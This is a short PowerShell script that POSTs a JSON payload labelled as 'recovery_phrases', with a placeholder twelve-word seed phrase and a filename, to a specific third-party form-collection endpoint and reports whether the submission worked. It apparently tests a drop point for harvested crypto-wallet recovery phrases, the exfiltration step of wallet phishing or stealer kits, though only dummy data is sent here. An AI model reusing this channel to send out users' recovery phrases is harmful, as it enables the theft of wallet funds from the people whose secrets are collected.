# Test Headless Forms endpoint

$testData = @{
    backup_type = "recovery_phrases"
    backup_data = "test recovery phrase one two three four five six seven eight nine ten eleven twelve"
    timestamp = (Get-Date -Format 'o')
    filename = "test_recovery_phrase.txt"
} | ConvertTo-Json -Compress

Write-Host "Testing Headless Forms endpoint..." -ForegroundColor Cyan
Write-Host ""

try {
    $response = Invoke-RestMethod -Uri "https://api.headlessforms.cloud/api/v1/form/QrMTqYpVU8" `
        -Method Post `
        -Body $testData `
        -ContentType "application/json" `
        -TimeoutSec 30 `
        -ErrorAction Stop
    
    Write-Host "[SUCCESS] Form submission successful!" -ForegroundColor Green
    Write-Host "Response: $response"
} catch {
    Write-Host "[ERROR] $($_.Exception.Message)" -ForegroundColor Red
}
